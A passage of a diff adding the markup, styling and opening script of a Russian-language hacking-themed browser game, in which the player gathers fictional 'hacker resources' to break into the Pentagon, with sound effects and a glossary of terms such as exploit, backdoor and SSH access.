@@ -1,0 +1,2480 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Киберквест · Гиперборейский ИИ</title>
+    <style>
+        /* --- ОСНОВНЫЕ СТИЛИ --- */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background: #060d17;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Courier New', Courier, monospace;
+            padding: 12px;
+            margin: 0;
+        }
+
+        .container {
+            background: #0c1422;
+            width: 100%;
+            max-width: 1024px;
+            border-radius: 28px;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.9), 0 0 0 1px #1f3550 inset, 0 0 40px #0a1a2a;
+            padding: 24px 28px 28px;
+        }
+
+        .header {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            border-bottom: 1px solid #1a2a40;
+            padding-bottom: 14px;
+            margin-bottom: 16px;
+            flex-wrap: wrap;
+        }
+
+        .header .badge {
+            background: #0d1a2a;
+            color: #6fcf9a;
+            font-size: 15px;
+            font-weight: bold;
+            padding: 6px 20px;
+            border-radius: 40px;
+            border: 1px solid #2a5a5a;
+            box-shadow: 0 0 12px #0a3a3a;
+            letter-spacing: 0.5px;
+        }
+
+        .header .title {
+            color: #b0d4f0;
+            font-size: 22px;
+            font-weight: 700;
+            letter-spacing: 1.5px;
+            text-shadow: 0 0 10px #1a5f8f;
+        }
+
+        .header .title .blink {
+            animation: blink 1s step-end infinite;
+            color: #6fdfbf;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.2; }
+        }
+
+        .header .hint-toggle {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-left: auto;
+            color: #6a8a9a;
+            font-size: 13px;
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .header .hint-toggle input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            accent-color: #3a7aaf;
+            cursor: pointer;
+            background: #0a1620;
+            border: 1px solid #2a4a6a;
+            border-radius: 4px;
+            appearance: none;
+            -webkit-appearance: none;
+            position: relative;
+            transition: 0.15s;
+        }
+
+        .header .hint-toggle input[type="checkbox"]:checked {
+            background: #1a4a70;
+            border-color: #4a8abf;
+        }
+
+        .header .hint-toggle input[type="checkbox"]:checked::after {
+            content: "✓";
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: #b0d8ff;
+            font-size: 14px;
+            font-weight: bold;
+        }
+
+        .header .hint-toggle input[type="checkbox"]:hover {
+            border-color: #4a8abf;
+        }
+
+        .header .hint-toggle .hint-label {
+            color: #7a9aaa;
+            transition: 0.15s;
+        }
+
+        .header .hint-toggle .hint-label.active {
+            color: #b0d8ff;
+        }
+
+        .status-bar {
+            display: flex;
+            justify-content: space-between;
+            background: #060e1a;
+            padding: 10px 18px;
+            border-radius: 40px;
+            border: 1px solid #1a2a40;
+            margin-bottom: 16px;
+            font-size: 15px;
+            color: #4a7a9a;
+            flex-wrap: wrap;
+            gap: 8px 16px;
+        }
+
+        .status-bar span {
+            color: #9ac0e0;
+        }
+        .status-bar .val {
+            color: #b0d8ff;
+            font-weight: bold;
+        }
+        .status-bar .danger {
+            color: #ff7a7a;
+        }
+        .status-bar .success {
+            color: #7fffa0;
+        }
+
+        .main-grid {
+            display: grid;
+            grid-template-columns: 1fr 1.8fr;
+            gap: 18px;
+        }
+
+        @media (max-width: 720px) {
+            .main-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .panel {
+            background: #050b16;
+            border-radius: 16px;
+            border: 1px solid #1a2a44;
+            box-shadow: inset 0 0 30px rgba(0, 5, 20, 0.9);
+            padding: 18px 20px;
+            min-height: 200px;
+        }
+
+        .panel-title {
+            color: #6a9fc0;
+            font-size: 14px;
+            font-weight: bold;
+            letter-spacing: 1.5px;
+            border-bottom: 1px solid #142233;
+            padding-bottom: 10px;
+            margin-bottom: 14px;
+            text-transform: uppercase;
+        }
+
+        .resources {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 6px 10px;
+        }
+
+        .resource {
+            font-size: 13px;
+            padding: 3px 10px;
+            border-radius: 10px;
+            background: #0a1620;
+            border: 1px solid #1a2a3a;
+            cursor: context-menu;
+            transition: 0.15s;
+            position: relative;
+        }
+
+        .resource:hover {
+            border-color: #4a7a9a;
+            background: #0f1f33;
+        }
+
+        .resource.owned {
+            color: #7fffa0;
+            border-color: #2a6a4a;
+            background: #0a1a0a;
+        }
+
+        .resource.missing {
+            color: #6a6a7a;
+            border-color: #2a2a3a;
+            background: #0a0a12;
+            opacity: 0.6;
+        }
+
+        .resource.danger {
+            color: #ff7a7a;
+            border-color: #5a2a2a;
+            background: #1a0a0a;
+        }
+
+        .resource.hyperborean {
+            color: #d4a0ff;
+            border-color: #6a3a8a;
+            background: #1a0a2a;
+            box-shadow: 0 0 20px rgba(120, 60, 180, 0.2);
+        }
+
+        .actions-scroll {
+            max-height: 480px;
+            overflow-y: auto;
+            padding-right: 4px;
+        }
+
+        .actions-scroll::-webkit-scrollbar {
+            width: 5px;
+        }
+        .actions-scroll::-webkit-scrollbar-track {
+            background: #040a14;
+        }
+        .actions-scroll::-webkit-scrollbar-thumb {
+            background: #1f3f5f;
+            border-radius: 8px;
+        }
+
+        .actions-list {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .action-btn {
+            background: #0f1f33;
+            border: 1px solid #2a5a7a;
+            border-radius: 12px;
+            padding: 10px 14px;
+            color: #c8e0ff;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            cursor: context-menu;
+            transition: 0.15s;
+            text-align: left;
+            box-shadow: 0 2px 0 #081a28;
+            width: 100%;
+            line-height: 1.4;
+            position: relative;
+        }
+
+        .action-btn:hover:not(:disabled) {
+            background: #1a3a55;
+            border-color: #4a8abf;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 0 #081a28;
+        }
+
+        .action-btn:active:not(:disabled) {
+            transform: translateY(2px);
+            box-shadow: 0 0px 0 #081a28;
+        }
+
+        .action-btn:disabled {
+            opacity: 1 !important;
+            transform: translateY(1px);
+            box-shadow: 0 1px 0 #081a28;
+            cursor: not-allowed;
+            border-color: #3a4a5a;
+            background: #1a2a3a;
+        }
+
+        .action-btn .action-label {
+            font-weight: bold;
+            color: #b0d8ff;
+            font-size: 14px;
+        }
+
+        .action-btn .action-hint {
+            font-size: 12px;
+            color: #8aacb8;
+            display: block;
+            margin-top: 2px;
+        }
+
+        .action-btn .action-chance {
+            font-size: 12px;
+            display: inline-block;
+            margin-top: 4px;
+            padding: 1px 8px;
+            border-radius: 10px;
+            background: #0a1620;
+        }
+
+        .action-btn .action-chance.high {
+            color: #7fffa0;
+            border: 1px solid #2a6a4a;
+        }
+        .action-btn .action-chance.medium {
+            color: #f0c070;
+            border: 1px solid #5a4a2a;
+        }
+        .action-btn .action-chance.low {
+            color: #ff7a7a;
+            border: 1px solid #5a2a2a;
+        }
+        .action-btn .action-chance.zero {
+            color: #6a6a7a;
+            border: 1px solid #3a3a4a;
+        }
+
+        .action-btn .action-locked-badge {
+            display: inline-block;
+            font-size: 10px;
+            padding: 1px 10px;
+            border-radius: 10px;
+            background: #3a1a1a;
+            border: 1px solid #5a2a2a;
+            color: #ff7a7a;
+            margin-left: 8px;
+            font-weight: bold;
+            animation: pulse-lock 1.5s ease-in-out infinite;
+        }
+
+        .action-btn .action-hyperborean {
+            border-color: #6a3a8a;
+            background: #0f0a1f;
+            box-shadow: 0 0 20px rgba(120, 60, 180, 0.1);
+        }
+
+        @keyframes pulse-lock {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .action-btn .action-resource-block {
+            margin-top: 6px;
+            padding-top: 6px;
+            border-top: 1px solid #1a2a3a;
+        }
+
+        .action-btn .action-resource-block .block-label {
+            font-size: 10px;
+            color: #5a7a8a;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            display: block;
+            margin-bottom: 3px;
+        }
+
+        .action-btn .action-resource-block .block-label .count {
+            color: #4a6a7a;
+            font-size: 9px;
+        }
+
+        .action-btn .action-res-tag {
+            font-size: 11px;
+            padding: 2px 10px;
+            border-radius: 10px;
+            display: inline-block;
+            margin: 2px 4px 2px 0;
+            background: #0a1620;
+            border: 1px solid #1a2a3a;
+        }
+
+        .action-btn .action-res-tag.required {
+            color: #ff7a7a;
+            border-color: #4a2a2a;
+        }
+
+        .action-btn .action-res-tag.required.owned {
+            color: #7fffa0;
+            border-color: #2a6a4a;
+            background: #0a1a0a;
+        }
+
+        .action-btn .action-res-tag.gained {
+            color: #7fffa0;
+            border-color: #2a4a2a;
+        }
+
+        .action-btn .action-res-tag.gained.owned {
+            color: #6a8a7a;
+            border-color: #2a3a2a;
+            opacity: 0.6;
+        }
+
+        .action-btn .action-res-tag.hyperborean {
+            color: #d4a0ff;
+            border-color: #6a3a8a;
+            background: #1a0a2a;
+        }
+
+        .action-btn .action-tags {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 4px 8px;
+            margin-top: 4px;
+        }
+
+        .action-btn .action-tag {
+            font-size: 10px;
+            padding: 1px 8px;
+            border-radius: 10px;
+            background: #0a1620;
+            border: 1px solid #1a2a3a;
+            color: #6a8a9a;
+        }
+
+        .action-btn .action-tag.hyperborean {
+            color: #d4a0ff;
+            border-color: #4a2a6a;
+            background: #0f0a1f;
+        }
+
+        .action-btn .action-status-text {
+            font-size: 11px;
+            display: block;
+            margin-top: 4px;
+            padding: 2px 8px;
+            border-radius: 6px;
+            background: #0a1620;
+            color: #6a8a7a;
+        }
+
+        .action-btn .action-status-text.ready {
+            color: #7fffa0;
+            border-left: 3px solid #7fffa0;
+        }
+
+        .action-btn .action-status-text.blocked {
+            color: #ff7a7a;
+            border-left: 3px solid #ff7a7a;
+        }
+
+        .action-btn .hint-hidden {
+            display: none !important;
+        }
+
+        .action-btn .hint-visible {
+            display: block;
+        }
+
+        .log-panel {
+            grid-column: 1 / -1;
+            max-height: 180px;
+            overflow-y: auto;
+            background: #040a14;
+            border-radius: 12px;
+            padding: 12px 16px;
+            border: 1px solid #142233;
+        }
+
+        .log-panel::-webkit-scrollbar {
+            width: 5px;
+        }
+        .log-panel::-webkit-scrollbar-track {
+            background: #040a14;
+        }
+        .log-panel::-webkit-scrollbar-thumb {
+            background: #1f3f5f;
+            border-radius: 8px;
+        }
+
+        .log-entry {
+            font-size: 13px;
+            padding: 3px 0;
+            border-bottom: 1px solid #0a1620;
+            color: #8ab0d0;
+            line-height: 1.5;
+        }
+
+        .log-entry .time {
+            color: #4a6a7a;
+            margin-right: 10px;
+        }
+
+        .log-entry.success {
+            color: #7fffa0;
+        }
+        .log-entry.fail {
+            color: #ff7a7a;
+        }
+        .log-entry.info {
+            color: #7fb8e0;
+        }
+        .log-entry.warn {
+            color: #f0c070;
+        }
+        .log-entry.victory {
+            color: #d4a0ff;
+            font-weight: bold;
+            font-size: 15px;
+            text-shadow: 0 0 30px rgba(120, 60, 180, 0.5);
+        }
+        .log-entry.resource {
+            color: #7fbfdf;
+        }
+        .log-entry.hyperborean {
+            color: #d4a0ff;
+            text-shadow: 0 0 20px rgba(120, 60, 180, 0.3);
+        }
+
+        .nav-actions {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin-top: 12px;
+        }
+
+        .btn-secondary {
+            background: #1a2233;
+            border: 1px solid #3a4a6a;
+            border-radius: 40px;
+            padding: 8px 20px;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            color: #b0c8e0;
+            cursor: pointer;
+            transition: 0.15s;
+            box-shadow: 0 2px 0 #0a1220;
+        }
+
+        .btn-secondary:hover:not(:disabled) {
+            background: #2a3a55;
+            border-color: #5a7a9a;
+            transform: translateY(-2px);
+        }
+
+        .btn-secondary:disabled {
+            opacity: 0.3;
+            cursor: not-allowed;
+            transform: translateY(1px);
+        }
+
+        .btn-danger {
+            background: #2a1a1a;
+            border-color: #5a3a3a;
+            color: #ff8a7a;
+        }
+
+        .btn-danger:hover:not(:disabled) {
+            background: #3a2a2a;
+            border-color: #7a4a4a;
+        }
+
+        .file-reveal {
+            background: #0a1f1a;
+            border-left: 6px solid #7fffa0;
+            padding: 16px 20px;
+            border-radius: 12px;
+            color: #b0f0c0;
+            margin-top: 14px;
+            box-shadow: 0 0 40px rgba(0, 255, 150, 0.1);
+            font-size: 15px;
+            line-height: 1.6;
+        }
+
+        .file-reveal .title {
+            font-size: 17px;
+            color: #b0ffd0;
+        }
+
+        .file-reveal.hyperborean {
+            border-left-color: #a060d0;
+            background: #0a0a1f;
+            box-shadow: 0 0 60px rgba(120, 60, 180, 0.2);
+            color: #d4b0f0;
+        }
+
+        .file-reveal.hyperborean .title {
+            color: #d4a0ff;
+        }
+
+        .progress-info {
+            color: #6a8a9a;
+            font-size: 13px;
+            margin-top: 10px;
+        }
+
+        .progress-info .highlight {
+            color: #b0d8ff;
+            font-weight: bold;
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 4px 12px;
+            margin-top: 8px;
+            font-size: 12px;
+            color: #6a8a9a;
+        }
+
+        .stats-grid .stat-label {
+            color: #4a6a7a;
+        }
+        .stats-grid .stat-value {
+            color: #b0d8ff;
+            text-align: right;
+        }
+
+        /* --- ТУЛТИП --- */
+        .tooltip-box {
+            position: fixed;
+            max-width: 480px;
+            min-width: 280px;
+            background: rgba(10, 20, 35, 0.95);
+            border: 1px solid #2a5a7a;
+            border-radius: 16px;
+            box-shadow: 0 10px 60px rgba(0, 0, 0, 0.9), 0 0 0 1px #1a3a4a inset, 0 0 40px rgba(0, 100, 200, 0.08);
+            padding: 18px 22px 20px;
+            color: #c8e0ff;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            line-height: 1.6;
+            pointer-events: auto;
+            z-index: 10001;
+            animation: tooltipFade 0.2s ease-out;
+            backdrop-filter: blur(8px);
+            display: none;
+        }
+
+        @keyframes tooltipFade {
+            from { opacity: 0; transform: scale(0.95) translateY(-8px); }
+            to { opacity: 1; transform: scale(1) translateY(0); }
+        }
+
+        .tooltip-box .tooltip-title {
+            font-size: 15px;
+            font-weight: bold;
+            color: #b0d8ff;
+            border-bottom: 1px solid #1a2a4a;
+            padding-bottom: 8px;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .tooltip-box .tooltip-title .badge-type {
+            font-size: 10px;
+            padding: 2px 10px;
+            border-radius: 20px;
+            background: #0a1a2a;
+            border: 1px solid #2a4a6a;
+            color: #5a8a9a;
+            font-weight: normal;
+        }
+
+        .tooltip-box .tooltip-title .badge-type.resource {
+            border-color: #2a6a4a;
+            color: #5a9a7a;
+        }
+
+        .tooltip-box .tooltip-title .badge-type.action {
+            border-color: #4a6a8a;
+            color: #6a8aaa;
+        }
+
+        .tooltip-box .tooltip-title .badge-type.hyperborean {
+            border-color: #6a3a8a;
+            color: #d4a0ff;
+            background: #1a0a2a;
+        }
+
+        .tooltip-box .tooltip-description {
+            color: #b0c8e0;
+            font-size: 13px;
+            line-height: 1.7;
+            white-space: pre-wrap;
+        }
+
+        .tooltip-box .tooltip-meta {
+            margin-top: 10px;
+            padding-top: 10px;
+            border-top: 1px solid #1a2a3a;
+            font-size: 11px;
+            color: #5a7a8a;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 6px 16px;
+        }
+
+        .tooltip-box .tooltip-meta span {
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .tooltip-box .tooltip-close-hint {
+            position: absolute;
+            top: 12px;
+            right: 16px;
+            font-size: 11px;
+            color: #3a5a6a;
+            cursor: pointer;
+            transition: 0.15s;
+            pointer-events: auto;
+        }
+
+        .tooltip-box .tooltip-close-hint:hover {
+            color: #7a9aaa;
+        }
+
+        .context-hint {
+            font-size: 10px;
+            color: #3a5a6a;
+            margin-top: 4px;
+            display: block;
+            opacity: 0.6;
+            font-style: italic;
+        }
+
+        /* --- Терминал --- */
+        .terminal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.88);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            animation: fadeIn 0.3s ease-out;
+        }
+
+        .terminal-overlay.active {
+            display: flex;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .terminal-window {
+            background: #0a0a0a;
+            border-radius: 16px;
+            border: 1px solid #2a4a5a;
+            box-shadow: 0 0 80px rgba(0, 150, 255, 0.15), 0 0 0 1px #1a3a4a inset;
+            width: 92%;
+            max-width: 820px;
+            max-height: 88vh;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            animation: slideUp 0.3s ease-out;
+        }
+
+        @keyframes slideUp {
+            from { transform: translateY(30px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .terminal-header {
+            background: #141414;
+            padding: 10px 18px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #1a2a2a;
+            flex-shrink: 0;
+        }
+
+        .terminal-header .title {
+            color: #5a8a7a;
+            font-size: 13px;
+            letter-spacing: 1px;
+        }
+
+        .terminal-header .title .blink {
+            animation: blink 1s step-end infinite;
+            color: #4a8a6a;
+        }
+
+        .terminal-header .close-btn {
+            background: #2a1a1a;
+            border: 1px solid #4a2a2a;
+            border-radius: 30px;
+            padding: 4px 16px;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            color: #ff7a7a;
+            cursor: pointer;
+            transition: 0.15s;
+        }
+
+        .terminal-header .close-btn:hover {
+            background: #3a1a1a;
+            border-color: #6a3a3a;
+            color: #ff9a7a;
+        }
+
+        .terminal-body {
+            padding: 16px 20px 20px;
+            overflow-y: auto;
+            flex: 1;
+            min-height: 300px;
+            max-height: 58vh;
+            background: #0a0a0a;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            line-height: 1.7;
+            color: #b0d0d0;
+            user-select: text;
+        }
+
+        .terminal-body::-webkit-scrollbar {
+            width: 6px;
+        }
+        .terminal-body::-webkit-scrollbar-track {
+            background: #0a0a0a;
+        }
+        .terminal-body::-webkit-scrollbar-thumb {
+            background: #1a3a3a;
+            border-radius: 8px;
+        }
+
+        .terminal-body .line {
+            white-space: pre-wrap;
+            word-break: break-all;
+            opacity: 0;
+            animation: typeIn 0.04s forwards;
+        }
+
+        .terminal-body .line.prompt {
+            color: #5a8a6a;
+        }
+
+        .terminal-body .line.command {
+            color: #b0d8ff;
+        }
+
+        .terminal-body .line.output {
+            color: #8ab0c0;
+        }
+
+        .terminal-body .line.success {
+            color: #7fffa0;
+        }
+
+        .terminal-body .line.error {
+            color: #ff7a7a;
+        }
+
+        .terminal-body .line.warning {
+            color: #f0c070;
+        }
+
+        .terminal-body .line.highlight {
+            color: #f0e68c;
+        }
+
+        .terminal-body .line.hyperborean {
+            color: #d4a0ff;
+            text-shadow: 0 0 20px rgba(120, 60, 180, 0.3);
+        }
+
+        .terminal-body .line .cursor {
+            display: inline-block;
+            width: 10px;
+            height: 18px;
+            background: #7fffa0;
+            animation: cursorBlink 0.6s step-end infinite;
+            vertical-align: text-bottom;
+            margin-left: 2px;
+        }
+
+        @keyframes cursorBlink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+
+        @keyframes typeIn {
+            from { opacity: 0; transform: translateY(2px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .terminal-footer {
+            background: #0e0e0e;
+            padding: 8px 18px;
+            border-top: 1px solid #1a2a2a;
+            display: flex;
+            justify-content: space-between;
+            font-size: 11px;
+            color: #3a5a5a;
+            flex-shrink: 0;
+        }
+
+        .terminal-footer .status {
+            color: #5a8a6a;
+        }
+
+        .terminal-footer .status.error {
+            color: #ff7a7a;
+        }
+
+        .terminal-footer .status.hyperborean {
+            color: #d4a0ff;
+        }
+
+        .copy-hint {
+            color: #3a5a5a;
+            font-size: 10px;
+            cursor: default;
+            user-select: none;
+        }
+
+        .action-btn .action-resource-block .block-label .icon {
+            margin-right: 4px;
+        }
+
+        /* --- Стили для режима тестирования --- */
+        .test-mode-badge {
+            background: #3a2a1a;
+            border: 1px solid #8a6a3a;
+            color: #f0c070;
+            font-size: 11px;
+            padding: 2px 12px;
+            border-radius: 20px;
+            margin-left: 10px;
+            font-weight: bold;
+            animation: pulse-test 2s ease-in-out infinite;
+        }
+
+        @keyframes pulse-test {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="header">
+            <span class="badge">🛸 ROOT · CYBER</span>
+            <span class="title">◈ <span class="blink">⚡</span> ГИПЕРБОРЕЙСКИЙ ИИ</span>
+
+            <label class="hint-toggle" id="hintToggle">
+                <input type="checkbox" id="hintCheckbox">
+                <span class="hint-label" id="hintLabel">💡 Подсказка</span>
+            </label>
+
+            <span style="margin-left: auto; color: #4a7f9f; font-size: 16px; font-weight: bold;" id="levelDisplay">🔓 ВЗЛОМ</span>
+        </div>
+
+        <div class="status-bar" id="statusBar">
+            <span>📊 РЕСУРСОВ: <span class="val" id="progressDisplay">0</span>/24</span>
+            <span>🔓 ДОСТУПНО: <span class="val" id="accessDisplay">0</span>/27</span>
+            <span>⚠ ОБНАРУЖЕНИЕ: <span class="val danger" id="detectionDisplay">0%</span></span>
+            <span>🔄 ПОПЫТОК: <span class="val" id="attemptsDisplay">0</span></span>
+            <span id="testModeBadge" style="display:none;"></span>
+        </div>
+
+        <div class="main-grid">
+            <div class="panel">
+                <div class="panel-title">🔑 РЕСУРСЫ ХАКЕРА</div>
+                <div class="resources" id="resourcesContainer"></div>
+                <div class="stats-grid" id="statsGrid">
+                    <span class="stat-label">Всего ресурсов:</span>
+                    <span class="stat-value" id="totalResources">24</span>
+                    <span class="stat-label">Имеется:</span>
+                    <span class="stat-value" id="ownedResources">0</span>
+                    <span class="stat-label">Доступно действий:</span>
+                    <span class="stat-value" id="availableActions">0</span>
+                </div>
+                <div class="progress-info">
+                    <span id="progressText">🎯 Цель: проникнуть в недра Пентагона и активировать Лисп-машину</span>
+                </div>
+                <span class="context-hint">🖱 ПКМ по ресурсу — справка</span>
+            </div>
+
+            <div class="panel">
+                <div class="panel-title">🎯 ВСЕ ДЕЙСТВИЯ</div>
+                <div class="actions-scroll" id="actionsScroll">
+                    <div class="actions-list" id="actionsContainer"></div>
+                </div>
+                <div class="nav-actions">
+                    <button class="btn-secondary btn-danger" id="resetBtn">⟲ СБРОС</button>
+                </div>
+                <span class="context-hint">🖱 ПКМ по действию — справка</span>
+            </div>
+
+            <div class="log-panel" id="logPanel">
+                <div style="color: #4a6a7a; font-size: 13px; margin-bottom: 8px;">📜 ЛОГ ОПЕРАЦИИ</div>
+                <div id="logContainer">
+                    <div class="log-entry info"><span class="time">[00:00]</span> Инициализация операции...</div>
+                </div>
+            </div>
+        </div>
+
+        <div id="secretFiles"></div>
+    </div>
+
+    <!-- ТЕРМИНАЛ ОВЕРЛЕЙ -->
+    <div class="terminal-overlay" id="terminalOverlay">
+        <div class="terminal-window">
+            <div class="terminal-header">
+                <span class="title">◈ <span class="blink">⚡</span> ROOT · SHELL</span>
+                <span class="copy-hint">📋 выделите текст для копирования</span>
+                <button class="close-btn" id="closeTerminalBtn">✕ ЗАКРЫТЬ</button>
+            </div>
+            <div class="terminal-body" id="terminalBody"></div>
+            <div class="terminal-footer">
+                <span class="status" id="statusText">● ГОТОВ</span>
+                <span id="progressTextTerminal">0%</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- ТУЛТИП -->
+    <div class="tooltip-box" id="tooltipBox">
+        <div class="tooltip-close-hint" id="tooltipClose">✕ закрыть</div>
+        <div class="tooltip-title" id="tooltipTitle">
+            <span id="tooltipName">Название</span>
+            <span class="badge-type" id="tooltipType">ресурс</span>
+        </div>
+        <div class="tooltip-description" id="tooltipDescription">Описание отсутствует</div>
+        <div class="tooltip-meta" id="tooltipMeta"></div>
+    </div>
+
+    <script>
+        (function() {
+            // ============================================================
+            //  РЕЖИМ ТЕСТИРОВАНИЯ
+            //  true  — все ресурсы и действия открыты с самого начала
+            //  false — обычный режим игры
+            // ============================================================
+            const TEST_MODE = false;
+
+            // ---- АУДИО ----
+            let audioCtx = null;
+
+            function initAudio() {
+                if (!audioCtx) {
+                    audioCtx = new(window.AudioContext || window.webkitAudioContext)();
+                }
+            }
+
+            function playKeyClick(volume = 0.05) {
+                try {
+                    initAudio();
+                    const osc = audioCtx.createOscillator();
+                    const gain = audioCtx.createGain();
+                    osc.type = 'square';
+                    osc.frequency.setValueAtTime(700 + Math.random() * 500, audioCtx.currentTime);
+                    gain.gain.setValueAtTime(volume, audioCtx.currentTime);
+                    gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.035);
+                    osc.connect(gain);
+                    gain.connect(audioCtx.destination);
+                    osc.start();
+                    osc.stop(audioCtx.currentTime + 0.035);
+                } catch (e) {}
+            }
+
+            function playReturn() {
+                try {
+                    initAudio();
+                    const osc = audioCtx.createOscillator();
+                    const gain = audioCtx.createGain();
+                    osc.type = 'sine';
+                    osc.frequency.setValueAtTime(600, audioCtx.currentTime);
+                    osc.frequency.exponentialRampToValueAtTime(900, audioCtx.currentTime + 0.08);
+                    gain.gain.setValueAtTime(0.07, audioCtx.currentTime);
+                    gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.08);
+                    osc.connect(gain);
+                    gain.connect(audioCtx.destination);
+                    osc.start();
+                    osc.stop(audioCtx.currentTime + 0.08);
+                } catch (e) {}
+            }
+
+            function playSuccessSound() {
+                try {
+                    initAudio();
+                    [880, 1100].forEach((freq, i) => {
+                        setTimeout(() => {
+                            const osc = audioCtx.createOscillator();
+                            const gain = audioCtx.createGain();
+                            osc.type = 'sine';
+                            osc.frequency.setValueAtTime(freq, audioCtx.currentTime);
+                            gain.gain.setValueAtTime(0.10, audioCtx.currentTime);
+                            gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.12);
+                            osc.connect(gain);
+                            gain.connect(audioCtx.destination);
+                            osc.start();
+                            osc.stop(audioCtx.currentTime + 0.12);
+                        }, i * 100);
+                    });
+                } catch (e) {}
+            }
+
+            function playErrorSound() {
+                try {
+                    initAudio();
+                    const osc = audioCtx.createOscillator();
+                    const gain = audioCtx.createGain();
+                    osc.type = 'sawtooth';
+                    osc.frequency.setValueAtTime(200, audioCtx.currentTime);
+                    osc.frequency.exponentialRampToValueAtTime(150, audioCtx.currentTime + 0.3);
+                    gain.gain.setValueAtTime(0.08, audioCtx.currentTime);
+                    gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.3);
+                    osc.connect(gain);
+                    gain.connect(audioCtx.destination);
+                    osc.start();
+                    osc.stop(audioCtx.currentTime + 0.3);
+                } catch (e) {}
+            }
+
+            function playHyperboreanSound() {
+                try {
+                    initAudio();
+                    const notes = [440, 554.37, 659.25, 880];
+                    notes.forEach((freq, i) => {
+                        setTimeout(() => {
+                            const osc = audioCtx.createOscillator();
+                            const gain = audioCtx.createGain();
+                            osc.type = 'sine';
+                            osc.frequency.setValueAtTime(freq, audioCtx.currentTime);
+                            gain.gain.setValueAtTime(0.08, audioCtx.currentTime);
+                            gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.3);
+                            osc.connect(gain);
+                            gain.connect(audioCtx.destination);
+                            osc.start();
+                            osc.stop(audioCtx.currentTime + 0.3);
+                        }, i * 200);
+                    });
+                } catch (e) {}
+            }
+
+            // ---- ОПИСАНИЯ (МАРКЕРЫ) ----
+            const DESCRIPTIONS = {
+                // === БАЗОВЫЕ РЕСУРСЫ ===
+                'MARKER_NETWORK_ACCESS': 'Доступ к сети позволяет подключаться к удалённым системам и серверам. Это основа для сканирования, брутфорса и других сетевых атак.',
+                'MARKER_CREDENTIALS': 'Учётные данные — это логины и пароли (или их хеши), позволяющие аутентифицироваться в системе. Ключевой ресурс для большинства атак.',
+                'MARKER_ADMIN_RIGHTS': 'Права администратора дают полный контроль над системой. Позволяют устанавливать бэкдоры, модифицировать групповые политики и получать доступ к защищённым файлам.',
+                'MARKER_CAN_EXECUTE': 'Возможность запускать код — способность выполнять произвольные программы на целевой системе. Необходима для эксплуатации уязвимостей и установки бэкдоров.',
+                'MARKER_EXPLOIT': 'Эксплойт — программа или код, использующий уязвимость для получения несанкционированного доступа или повышения привилегий.',
+                'MARKER_BACKDOOR': 'Бэкдор — скрытый метод обхода аутентификации, обеспечивающий постоянный доступ к системе. Позволяет возвращаться в систему даже после перезагрузки.',
+                'MARKER_USER_LIST': 'Список пользователей содержит информацию о всех учётных записях в системе. Используется для целевых атак и социальной инженерии.',
+                'MARKER_EMAIL_ACCESS': 'Доступ к почте позволяет читать и отправлять письма от имени сотрудника. Используется для фишинга и сбора информации.',
+                'MARKER_VPN_ACCESS': 'Доступ к VPN позволяет подключаться к внутренней сети организации извне. Открывает доступ к ресурсам, недоступным из интернета.',
+                'MARKER_SSH_ACCESS': 'SSH-доступ позволяет подключаться к серверам по защищённому протоколу. Даёт возможность выполнять команды и управлять системой удалённо.',
+                'MARKER_DATABASE_ACCESS': 'Доступ к базе данных позволяет читать, изменять и извлекать данные из БД. Часто содержит хеши паролей и критическую информацию.',
+                'MARKER_FILE_SYSTEM_ACCESS': 'Доступ к файловой системе позволяет читать, записывать и удалять файлы на диске. Необходим для поиска секретных документов.',
